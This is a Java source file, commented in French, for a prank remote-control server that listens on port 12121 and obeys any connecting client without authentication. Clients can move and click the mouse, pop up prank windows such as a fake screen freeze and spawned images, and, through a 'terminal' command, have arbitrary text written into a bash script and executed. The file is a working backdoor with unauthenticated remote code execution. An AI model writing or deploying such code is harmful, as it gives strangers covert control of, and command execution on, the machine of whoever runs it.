import java.net.*;
import java.io.*;

import java.awt.Robot;
import java.awt.AWTException;
import java.awt.event.InputEvent;

import java.util.GregorianCalendar;
import java.util.ArrayList;

import BocchiEternel.*;
import PetitMessage.*;
import FauxFreeze.*;

public class ServeurInfo
{
	private static int portNumber = 12121;
	private static ArrayList<String> list;
	private static ArrayList<String> titre;
	
	//private static Robot robot = new Robot();
	
	public static void main( String[] args )
	{
		
		String info = "Info : ";
		
		try{
		
		FauxFreeze freeze = null;
		Robot robot = new Robot();
		ServerSocket ss = new ServerSocket(portNumber);
		
		while(true)
		{
			System.out.println("attente d'un client...");
			
			Socket toClient = ss.accept();
			System.out.println("client arrivé");
			
			PrintWriter out = new PrintWriter(toClient.getOutputStream(), true);
			out.println("Il est cool mon Serveur nan ? (C'est celui de Matéo c:)");
			out.println("les commande 'n' et 'i' marchent ici ");
			
			BufferedReader in;
			String message = " ";
			String retour;
			do
			{
				in = new BufferedReader( new InputStreamReader(toClient.getInputStream()));
				message = in.readLine(); //récupère le message
				
				retour = "Commande non existante";
				
				
				
				//mettre les lignes de commande
				if(message != null)
				{
					//bocchi de la mort
					if(message.equals("bocchi"))
					{
						new BocchiEternel("mort", 50);
						retour = "spawn bocchi";
					}
					
					//Deplacement de souris
					if(message.startsWith("souris"))
					{
						//souris move:100:200
						if(message.contains("move"))
						{
							String[] coo = message.split(":");
							
							robot.mouseMove(Integer.parseInt(coo[1]), Integer.parseInt(coo[2]));
						}
						
						if(message.contains("clickD"))
						{
							System.out.println("d");
							robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
							robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
						}
						
						if(message.contains("clickG"))
						{
							robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
							robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
						}
					}
					
					//ptit message
					if(message.startsWith("message"))
					{
						String[] msg = message.split("-");
						new PetitMessage(msg[1]);
						retour = "message recu";
					}
					
					//faux freeze
					if(message.startsWith("fauxfreeze"))
					{
						if(message.contains("start"))
						{
							freeze = new FauxFreeze();
						}
						else
						{
							freeze.dispose();
							freeze = null;
						}
					}

					//faux freeze
					if(message.startsWith("terminal"))
					{
						String[] s = message.split(":");
						
						File script = new File("temp_script.sh");
						try (PrintWriter writer = new PrintWriter(script)) {
							writer.println("#!/bin/bash");
							writer.println(s[1]);
						}
						
						// Rends le fichier exécutable
						script.setExecutable(true);

						// Utilise ProcessBuilder pour exécuter le script dans le terminal
						ProcessBuilder processBuilder = new ProcessBuilder("mate-terminal", "-e", "./temp_script.sh");
						processBuilder.directory(new File(System.getProperty("user.dir"))); // Répertoire courant

						// Lance le processus
						processBuilder.start();
							
					}

					out.println(retour);
					System.out.println( message );
				}
				
			}while( message != null );
			
			System.out.println("déconnexion");
			
			in.close();
			out.close();
			toClient.close();
		}
		
		}catch( Exception e ){ System.out.println("erreur de connection : " + e); }
	}
	
}
